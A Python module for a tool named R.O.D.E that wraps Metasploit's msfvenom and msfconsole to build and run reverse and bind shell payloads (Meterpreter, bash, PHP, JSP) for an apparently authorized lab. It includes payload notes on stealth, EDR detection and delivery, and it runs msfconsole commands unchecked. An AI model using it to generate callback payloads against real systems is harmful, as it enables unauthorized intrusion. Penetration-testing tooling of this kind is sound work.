"""
Metasploit integration - a thin, honest wrapper around the REAL upstream FOSS
tools (msfvenom + msfconsole). R.O.D.E does NOT author exploits or malware; it
builds the exact command the well-known tool would run, explains every flag,
and (optionally) runs that tool for you inside Docker or a local install.

Intended use: your OWN authorized lab (e.g. a Pop!_OS box you own, on your own
network). Every builder call is validated:
  * payload must be in a curated allowlist of standard, documented payloads,
  * LHOST must be a real IP; a public LHOST raises a loud warning,
  * LPORT / iterations are range-checked,
  * output format + encoder must be in an allowlist,
  * everything is an argv LIST run with shell=False - no shell to inject into.

Nothing here is novel: msfvenom is on every pentest distro and taught in every
ethical-hacking course. We wrap it; we do not reinvent it.
"""
from __future__ import annotations

import asyncio
import ipaddress
import os
import re
import shutil
import subprocess
import time
from typing import Callable, Optional

from .logger import get_logger

log = get_logger("msf")

# The official image. Same tool the community uses; we never bake our own.
DOCKER_IMAGE = os.getenv("RODE_MSF_IMAGE", "metasploitframework/metasploit-framework")

# ── Payload catalog ────────────────────────────────────────────────────────
# A curated shortlist of standard payloads. severity = impact if it lands
# (all of these yield code execution, so high/critical). loudness = how likely
# network sensors / EDR notice, on the same 1-5 scale the rest of R.O.D.E uses.
#   connect: "reverse" (target calls back to you - beats egress firewalls,
#            stealthier) or "bind" (target opens a port - usually blocked by
#            inbound firewalls and easy to spot).
#   stage:   "staged" (tiny stub pulls the rest over the wire - smaller file,
#            more network chatter) or "stageless" (whole payload in one blob -
#            bigger file, quieter on the wire).
PAYLOADS = [
    {"id": "linux/x64/meterpreter/reverse_tcp", "os": "linux", "arch": "x64",
     "connect": "reverse", "stage": "staged", "meterpreter": True,
     "fmt": "elf", "severity": "critical", "loudness": 3,
     "desc": "Full Meterpreter session on 64-bit Linux, calling back to you. The "
             "go-to for a Pop!_OS / Ubuntu lab target."},
    {"id": "linux/x86/meterpreter/reverse_tcp", "os": "linux", "arch": "x86",
     "connect": "reverse", "stage": "staged", "meterpreter": True,
     "fmt": "elf", "severity": "critical", "loudness": 3,
     "desc": "Meterpreter on 32-bit Linux. Use only if the target is truly 32-bit."},
    {"id": "linux/x64/shell_reverse_tcp", "os": "linux", "arch": "x64",
     "connect": "reverse", "stage": "stageless", "meterpreter": False,
     "fmt": "elf", "severity": "high", "loudness": 2,
     "desc": "Plain reverse shell (no Meterpreter). Small, quiet, fewer features - "
             "good when you just need a shell and want minimal footprint."},
    {"id": "cmd/unix/reverse_bash", "os": "linux", "arch": "cmd",
     "connect": "reverse", "stage": "stageless", "meterpreter": False,
     "fmt": "raw", "severity": "high", "loudness": 2,
     "desc": "A one-line bash reverse shell (no binary at all). Handy for command-"
             "injection spots. Pair with a netcat/msfconsole listener."},
    {"id": "windows/x64/meterpreter/reverse_tcp", "os": "windows", "arch": "x64",
     "connect": "reverse", "stage": "staged", "meterpreter": True,
     "fmt": "exe", "severity": "critical", "loudness": 4,
     "desc": "Meterpreter on 64-bit Windows. Modern AV/EDR flags the vanilla build "
             "instantly - expect it to be caught unless the box is unprotected."},
    {"id": "windows/x64/shell/reverse_tcp", "os": "windows", "arch": "x64",
     "connect": "reverse", "stage": "staged", "meterpreter": False,
     "fmt": "exe", "severity": "high", "loudness": 3,
     "desc": "Staged native reverse shell on 64-bit Windows. Lighter than "
             "Meterpreter; still commonly signatured."},
    {"id": "windows/x64/meterpreter/bind_tcp", "os": "windows", "arch": "x64",
     "connect": "bind", "stage": "staged", "meterpreter": True,
     "fmt": "exe", "severity": "critical", "loudness": 5,
     "desc": "Bind payload: the TARGET opens a port and waits. Usually blocked by "
             "any inbound firewall and trivial to notice - reverse is preferred."},
    {"id": "osx/x64/meterpreter/reverse_tcp", "os": "macos", "arch": "x64",
     "connect": "reverse", "stage": "staged", "meterpreter": True,
     "fmt": "macho", "severity": "critical", "loudness": 3,
     "desc": "Meterpreter on 64-bit macOS. Gatekeeper/XProtect will resist "
             "unsigned binaries."},
    {"id": "python/meterpreter/reverse_tcp", "os": "cross", "arch": "python",
     "connect": "reverse", "stage": "staged", "meterpreter": True,
     "fmt": "raw", "severity": "high", "loudness": 2,
     "desc": "Meterpreter delivered as a Python script - cross-platform wherever "
             "Python runs. Quiet on disk (no compiled binary)."},
    {"id": "php/meterpreter/reverse_tcp", "os": "cross", "arch": "php",
     "connect": "reverse", "stage": "staged", "meterpreter": True,
     "fmt": "raw", "severity": "high", "loudness": 2,
     "desc": "Meterpreter as a PHP file - drop on a webserver you're testing, "
             "then browse to it to fire the callback."},
    {"id": "java/jsp_shell_reverse_tcp", "os": "cross", "arch": "java",
     "connect": "reverse", "stage": "stageless", "meterpreter": False,
     "fmt": "raw", "severity": "high", "loudness": 2,
     "desc": "JSP reverse shell for Java app servers (Tomcat, etc.)."},
]
_PAYLOAD_IDS = {p["id"] for p in PAYLOADS}

# Output formats we allow (a subset msfvenom supports). Keeps input clean.
FORMATS = ["exe", "elf", "macho", "raw", "python", "psh", "dll", "war", "jar",
           "hta-psh", "vba", "c"]
# Encoders: 'none' is honest default (encoding does NOT reliably beat modern AV).
ENCODERS = ["none", "x86/shikata_ga_nai", "x64/xor_dynamic", "cmd/powershell_base64"]

MAX_ITERATIONS = 20
_IP_OK = re.compile(r"^[0-9a-fA-F:.]+$")


def _is_private(ip: str) -> bool:
    try:
        a = ipaddress.ip_address(ip)
        return a.is_private or a.is_loopback or a.is_link_local
    except ValueError:
        return False


# ── availability ───────────────────────────────────────────────────────────
_cache: dict = {"ts": 0.0, "val": None}


def status(force: bool = False) -> dict:
    """Where can we run msfvenom/msfconsole? Prefers a local install, falls back
    to the official Docker image. Cached briefly."""
    now = time.time()
    if not force and _cache["val"] is not None and now - _cache["ts"] < 5:
        return _cache["val"]

    flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
    local = shutil.which("msfvenom")
    docker_ok = False
    image_present = False
    if shutil.which("docker"):
        try:
            r = subprocess.run(["docker", "info"], capture_output=True,
                               timeout=8, creationflags=flags)
            docker_ok = r.returncode == 0
            if docker_ok:
                q = subprocess.run(["docker", "images", "-q", DOCKER_IMAGE],
                                   capture_output=True, timeout=8, text=True,
                                   creationflags=flags)
                image_present = bool(q.stdout.strip())
        except Exception:
            docker_ok = False

    if local:
        mode = "local"
    elif docker_ok:
        mode = "docker"
    else:
        mode = "none"

    val = {
        "available": mode != "none",
        "mode": mode,
        "local_path": local,
        "docker_running": docker_ok,
        "image": DOCKER_IMAGE,
        "image_present": image_present,
        "pull_hint": f"docker pull {DOCKER_IMAGE}",
        "install_hint": (
            "Local: install the Metasploit Framework (docs.metasploit.com). "
            f"Or Docker: `docker pull {DOCKER_IMAGE}` (~2 GB) and start Docker Desktop."
        ),
    }
    _cache.update(ts=now, val=val)
    return val


# ── payload / msfvenom command builder ─────────────────────────────────────
def validate_build(opts: dict) -> dict:
    """Validate a payload-build request. Returns {ok, errors[], warnings[]}."""
    errors: list[str] = []
    warnings: list[str] = []

    payload = (opts.get("payload") or "").strip()
    if payload not in _PAYLOAD_IDS:
        errors.append(f"Unknown payload '{payload}'. Pick one from the catalog.")

    lhost = (opts.get("lhost") or "").strip()
    connect = next((p["connect"] for p in PAYLOADS if p["id"] == payload), "reverse")
    if connect == "reverse":
        if not lhost or not _IP_OK.match(lhost):
            errors.append("LHOST must be the IP the target calls back to (e.g. your "
                          "lab machine's 192.168.x.x address).")
        elif not _is_private(lhost):
            warnings.append(f"LHOST {lhost} is NOT a private/lab address. Only point "
                            "a callback at a host you control. Double-check this.")

    try:
        lport = int(opts.get("lport", 4444))
        if not (1 <= lport <= 65535):
            errors.append("LPORT must be 1-65535.")
    except (TypeError, ValueError):
        errors.append("LPORT must be a number.")

    fmt = (opts.get("format") or "").strip()
    if fmt and fmt not in FORMATS:
        errors.append(f"Format '{fmt}' not allowed. Choose one of: {', '.join(FORMATS)}.")

    enc = (opts.get("encoder") or "none").strip()
    if enc not in ENCODERS:
        errors.append(f"Encoder '{enc}' not allowed.")
    if enc != "none":
        warnings.append("Encoding does NOT reliably evade modern AV/EDR - it mainly "
                        "removes bad characters. Don't expect it to hide the payload.")

    try:
        iters = int(opts.get("iterations", 0))
        if not (0 <= iters <= MAX_ITERATIONS):
            errors.append(f"Iterations must be 0-{MAX_ITERATIONS}.")
    except (TypeError, ValueError):
        errors.append("Iterations must be a number.")

    return {"ok": not errors, "errors": errors, "warnings": warnings}


def build_argv(opts: dict, mode: str, out_container_path: str | None = None) -> list[str]:
    """Build the msfvenom argv LIST (no shell). `mode` is 'local' or 'docker'.
    In docker mode the file is written inside the container to out_container_path
    (which the caller mounts back to the host)."""
    payload = opts["payload"].strip()
    lhost = (opts.get("lhost") or "").strip()
    lport = str(int(opts.get("lport", 4444)))
    fmt = (opts.get("format") or "raw").strip()
    enc = (opts.get("encoder") or "none").strip()
    iters = int(opts.get("iterations", 0))
    connect = next((p["connect"] for p in PAYLOADS if p["id"] == payload), "reverse")

    argv = ["msfvenom", "-p", payload]
    if connect == "reverse" and lhost:
        argv.append(f"LHOST={lhost}")
    argv.append(f"LPORT={lport}")
    argv += ["-f", fmt]
    if enc and enc != "none":
        argv += ["-e", enc]
        if iters > 0:
            argv += ["-i", str(iters)]
    if out_container_path:
        argv += ["-o", out_container_path]

    if mode == "docker":
        flags = ["docker", "run", "--rm"]
        # only mount a workspace if we're writing a file out
        if out_container_path:
            mount = opts["_host_out_dir"].replace("\\", "/")
            flags += ["-v", f"{mount}:/out"]
        flags += [DOCKER_IMAGE]
        # In the official image, msfvenom lives in the WORKDIR and is NOT on the
        # PATH the entrypoint's su-exec searches - call it as ./msfvenom.
        return flags + ["./msfvenom"] + argv[1:]
    return argv


def display_command(opts: dict) -> str:
    """The human-readable command (always shown, whether or not we run it)."""
    return " ".join(build_argv(opts, "local", out_container_path=None))


async def run_venom(opts: dict, emit: Callable, out_dir: str | None = None) -> dict:
    """Run msfvenom, streaming output through emit(). Returns {exit_code, artifact}."""
    st = status()
    if not st["available"]:
        await emit("[RODE] Metasploit isn't available. " + st["install_hint"] + "\n")
        return {"exit_code": 1, "artifact": None}

    mode = st["mode"]
    artifact = None
    out_container = None
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)
        fmt = (opts.get("format") or "raw").strip()
        safe_p = re.sub(r"[^a-z0-9]+", "_", opts.get("payload", "payload").lower())
        fname = f"{safe_p}_{int(time.time())}.{fmt}"
        opts = {**opts, "_host_out_dir": os.path.abspath(out_dir)}
        if mode == "docker":
            out_container = "/out/" + fname
            artifact = os.path.join(out_dir, fname)
        else:
            out_container = os.path.join(os.path.abspath(out_dir), fname)
            artifact = out_container

    argv = build_argv(opts, mode, out_container_path=out_container)
    await emit("[CMD] " + " ".join(argv) + "\n")

    loop = asyncio.get_event_loop()

    def _blocking():
        code = 1
        try:
            flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            proc = subprocess.Popen(argv, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True,
                                    encoding="utf-8", errors="replace", bufsize=1,
                                    shell=False, creationflags=flags)
            for line in iter(proc.stdout.readline, ""):
                asyncio.run_coroutine_threadsafe(emit(line), loop)
            proc.wait()
            code = proc.returncode or 0
        except FileNotFoundError:
            asyncio.run_coroutine_threadsafe(emit(f"[RODE ERROR] not found: {argv[0]}\n"), loop)
            code = 127
        except Exception as e:
            asyncio.run_coroutine_threadsafe(emit(f"[RODE ERROR] {type(e).__name__}: {e}\n"), loop)
        return code

    code = await asyncio.to_thread(_blocking)
    if artifact and os.path.exists(artifact):
        await emit(f"[RODE] Wrote payload artifact: {artifact}\n")
    elif artifact:
        artifact = None
    return {"exit_code": code, "artifact": artifact}


async def run_console_cmd(command, emit) -> dict:
    """Run ONE msfconsole command in a fresh console and stream the output.
    Uses `msfconsole -q -x "<cmd>; exit"` so the process exits and its output is
    flushed reliably — unlike a piped interactive session (which buffers forever
    without a TTY). No session state carries between commands."""
    st = status()
    if not st["available"]:
        await emit("[RODE] msfconsole unavailable. " + st["install_hint"] + "\n")
        return {"exit_code": 1}
    command = (command or "").strip()
    if not command:
        return {"exit_code": 1}
    script = command + "; exit"
    flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
    if st["mode"] == "local":
        argv = ["msfconsole", "-q", "-x", script]
    else:
        argv = ["docker", "run", "--rm", "--network", "host", DOCKER_IMAGE,
                "./msfconsole", "-q", "-x", script]
    await emit(f'[CMD] msfconsole -q -x "{script}"\n')
    loop = asyncio.get_event_loop()

    def _blk():
        code = 1
        try:
            proc = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, encoding="utf-8", errors="replace",
                                    bufsize=1, shell=False, creationflags=flags)
            for line in iter(proc.stdout.readline, ""):
                asyncio.run_coroutine_threadsafe(emit(line), loop)
            proc.wait()
            code = proc.returncode or 0
        except FileNotFoundError:
            asyncio.run_coroutine_threadsafe(emit(f"[RODE ERROR] not found: {argv[0]}\n"), loop)
            code = 127
        except Exception as e:
            asyncio.run_coroutine_threadsafe(emit(f"[RODE ERROR] {type(e).__name__}: {e}\n"), loop)
        return code

    code = await asyncio.to_thread(_blk)
    return {"exit_code": code}

